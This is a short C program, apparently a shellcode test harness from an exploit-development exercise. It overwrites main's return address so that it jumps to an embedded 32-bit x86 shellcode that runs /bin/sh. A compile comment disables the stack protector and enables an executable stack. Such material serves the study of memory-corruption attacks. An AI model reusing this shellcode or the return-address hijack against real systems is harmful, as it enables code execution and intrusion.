#include <stdio.h>

//gcc -mpreferred-stack-boundary=2 -m32 -o shelltest2 shelltest2.c -fno-stack-protector -z execstack
char shellcode[] = "\xb8\x0b\x00\x00\x00\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xcd\x80";

int main(){
    int *ret;
    ret = &ret+2;
    *ret = shellcode;
    return 0;
}
